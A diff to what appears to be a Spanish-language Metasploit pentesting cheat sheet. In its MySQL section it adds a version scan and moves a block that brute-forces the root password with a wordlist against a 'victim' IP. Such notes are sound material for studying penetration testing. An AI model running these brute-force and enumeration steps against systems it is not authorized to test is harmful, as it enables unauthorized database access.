@@ -302,6 +302,30 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 ## Puerto 3306 MYSQL 
 
 ```bash 
+# Miramos la version del MySQL
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/mysql/mysql_version      # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico
+❯ msfconsole -q                                    # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/mysql/mysql_login         # Usamos el auxiliar
+	❯ options
+	❯ set USERNAME root
+	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+	❯ set STOP_ON_SUCCESS true
+	❯ setg RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set verbose false
+	❯ run 
+```
+
+```bash 
 # Mostrar las bases de datos 
 ❯ msfconsole -q                  # q = Quitar el banner de inicio
 
@@ -351,20 +375,6 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ set username root
 	❯ set password ""
 	❯ exploit
-```
-
-```bash 
-# Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico
-❯ msfconsole -q                                    # q = Quitar el banner de inicio
-
-	❯ use auxiliary/scanner/mysql/mysql_login         # Usamos el auxiliar
-	❯ options
-	❯ set username root
-	❯ set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
-	❯ set STOP_ON_SUCCESS true
-	❯ setg RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
-	❯ set verbose false
-	❯ run 
 ```
 
 ## Puerto 1433 MSSQL
